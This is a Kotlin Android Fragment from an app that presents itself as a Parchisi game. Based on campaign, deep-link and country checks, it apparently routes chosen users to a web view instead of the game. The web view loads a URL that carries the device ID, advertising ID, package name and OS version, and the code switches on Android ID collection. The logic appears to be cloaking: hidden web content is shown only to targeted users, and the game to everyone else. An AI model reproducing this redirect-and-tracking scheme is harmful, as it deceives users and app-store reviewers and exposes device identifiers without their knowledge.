package com.superking.parchisi

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.appsflyer.AppsFlyerLib
import com.superking.parchisi.MainLass.Companion.aps_id
import com.superking.parchisi.MainLass.Companion.instId
import com.superking.parchisi.MainLass.Companion.myId
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class OrFragment : Fragment() {
    private lateinit var mContext: Context
    val shareP: SharedPreferences by inject(named("SharedPreferences"))



    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        // Inflate the layout for this fragment
        return inflater.inflate(R.layout.fragment_or, container, false)
    }

    override fun onAttach(context: Context) {
        super.onAttach(context)
        mContext=context
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val count = shareP.getString("country", null)
        val appCamp = shareP.getString("appCamp", null)
        val deepSt = shareP.getString("deepSt", null)
        val countryDev = shareP.getString("countryDev", null)
        val apps = shareP.getString("apps", null)
        val wv = shareP.getString("wv", null)
        val mainId = shareP.getString("mainId", null)
        val pack = mContext.packageName


        val buildVers = Build.VERSION.RELEASE
        val myTrId = shareP.getString(myId, null)
        val myInstId: String? = shareP.getString(instId, null)


        val intentBeam = Intent(activity, DefActivity::class.java)
        val intentGame = Intent(activity, EnderActivity::class.java)

        val one = "deviceID="
        val subOne = "sub_id_1="
        val ad_id = "ad_id="
        val subFour = "sub_id_4="
        val subFive = "sub_id_5="
        val subSix = "sub_id_6="
        val namm = "naming"
        val trololo = "deeporg"

        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(mContext)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        shareP.edit().putString(aps_id, afId).apply()

        val linkApps = "$wv$subOne$appCamp&$one$afId&$ad_id$mainId&$subFour$pack&$subFive$buildVers&$subSix$namm"
        val linkMT = "$wv$one$myTrId&$ad_id$myInstId&$subFour$pack&$subFive$buildVers&$subSix$namm"
        val linkFB = "$wv$subOne$deepSt&$one$afId&$ad_id$mainId&$subFour$pack&$subFive$buildVers&$subSix$trololo"
        val linkFBNullApps = "$wv$subOne$deepSt&$one$myTrId&$ad_id$myInstId&$subFour$pack&$subFive$buildVers&$subSix$trololo"

        when(apps) {
            "1" ->
                if(appCamp!!.contains("tdb2")) {
                    shareP.edit().putString("link", linkApps).apply()
                    shareP.edit().putString("WebInt", "campaign").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else if (deepSt!=null||countryDev!!.contains(count.toString())) {
                    shareP.edit().putString("link", linkFB).apply()
                    shareP.edit().putString("WebInt", "deepLink").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else {
                    startActivity(intentGame)
                    activity?.finish()
                }
            "0" ->
                if(deepSt!=null) {
                    shareP.edit().putString("link", linkFBNullApps).apply()
                    shareP.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else if (countryDev!!.contains(count.toString())) {
                    shareP.edit().putString("link", linkMT).apply()
                    shareP.edit().putString("WebInt", "geo").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else {
                    startActivity(intentGame)
                    activity?.finish()
                }
        }
    }
}
